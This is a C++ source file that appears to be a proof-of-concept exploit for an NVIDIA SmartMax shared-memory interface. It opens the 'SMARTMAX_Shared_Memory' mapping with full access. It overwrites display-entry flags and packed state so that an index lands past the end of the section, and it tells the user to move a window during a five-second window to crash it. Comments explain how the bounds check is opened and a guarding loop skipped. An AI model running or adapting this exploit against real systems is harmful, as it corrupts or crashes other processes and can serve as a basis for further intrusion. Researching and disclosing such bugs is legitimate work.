#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <Windows.h>
#include <stdio.h>

static constexpr DWORD SHM_SIZE = 0x4ED0;
static constexpr DWORD SHM_FLAGS_OFF = 0x0008;  // SMARTMAX_SHARED.Flags
static constexpr DWORD DISPLAYS_OFF = 0x41F0;  // SMARTMAX_DISPLAY_ENTRY[0]
static constexpr DWORD DE_FLAGS_OFF = 0x0000;  // .Flags
static constexpr DWORD DE_RCDESKTOP_OFF = 0x000C;  // .rcDesktop
static constexpr DWORD DE_PACKED_OFF = 0x02E4;  // .dwPackedDisplayState

// entry+0x1C + 0xD1*0x10 = SHM+0x4F1C, past end 0x4ED0
static constexpr DWORD OOB_ARG10 = 0xD1;

int main(void)
{
    HANDLE hMap = OpenFileMappingW(FILE_MAP_ALL_ACCESS, FALSE, L"SMARTMAX_Shared_Memory");
    if (!hMap) { printf("OpenFileMappingW: %lu\n", GetLastError()); return 1; }

    BYTE* pShm = (BYTE*)MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, SHM_SIZE);
    if (!pShm) { printf("MapViewOfFile: %lu\n", GetLastError()); CloseHandle(hMap); return 1; }

    DWORD dwFlags = *(DWORD*)(pShm + SHM_FLAGS_OFF);
    DWORD dwDEFlg = *(DWORD*)(pShm + DISPLAYS_OFF + DE_FLAGS_OFF);
    RECT  rcDesk = *(RECT*)(pShm + DISPLAYS_OFF + DE_RCDESKTOP_OFF);
    DWORD dwPacked = *(DWORD*)(pShm + DISPLAYS_OFF + DE_PACKED_OFF);

    printf("Flags=0x%08lX  DE.Flags=0x%08lX  rcDesktop={%ld,%ld,%ld,%ld}  Packed=0x%08lX\n",
        dwFlags, dwDEFlg,
        rcDesk.left, rcDesk.top, rcDesk.right, rcDesk.bottom,
        dwPacked);
    if ((dwFlags & 7) != 7)
        printf("Hook gate not satisfied (bits 0-2 must be 7)\n");

    // Flags=0xFF opens the bounds check to any arg_10 in 0..254.
    // PackedFlags bits[12..19]=0xD1 is what NvSmartMaxGetTaskbarRect writes to *arg2.
    // Bit 26 skips its PtInRect loop (which would OOB first with Flags=0xFF).
    DWORD dwNewPacked = ((dwPacked & 0xFFF00FFF) | (OOB_ARG10 << 12)) | (1u << 26);
    *(DWORD*)(pShm + DISPLAYS_OFF + DE_FLAGS_OFF) = 0xFF;
    *(DWORD*)(pShm + DISPLAYS_OFF + DE_PACKED_OFF) = dwNewPacked;
    printf("Waiting 5s. Move any window during this time to crash it.\n");

    Sleep(5000);

    *(DWORD*)(pShm + DISPLAYS_OFF + DE_FLAGS_OFF) = dwDEFlg;
    *(DWORD*)(pShm + DISPLAYS_OFF + DE_PACKED_OFF) = dwPacked;
    printf("Restored.\n");

    UnmapViewOfFile(pShm);
    CloseHandle(hMap);
    return 0;
}